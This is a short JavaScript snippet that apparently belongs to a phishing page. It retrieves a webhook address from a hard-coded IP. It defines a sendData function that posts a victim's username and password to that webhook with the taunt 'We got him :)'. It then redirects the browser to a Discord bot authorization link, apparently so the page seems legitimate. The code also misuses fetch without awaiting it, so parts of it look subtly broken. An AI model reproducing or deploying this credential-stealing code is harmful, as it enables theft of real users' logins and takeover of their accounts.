
const response = fetch('http://70.95.197.6');

if (!response.ok) {
    console.log("it failed")
}

const webhook = response.text();
function sendData(User, Pass) {
    $.post(webhook,
    {
        'username': 'We got him :)',
        'content': 'Username:\n\t' + User + '\nPassword:\n\t' + Pass,
    }, function(data, status) {
        console.log("Data: " + data + "\nStatus: " + status);
    }
    )
    window.location = "https://discord.com/oauth2/authorize/?permissions=268454976&scope=bot&client_id=510016054391734273"
}
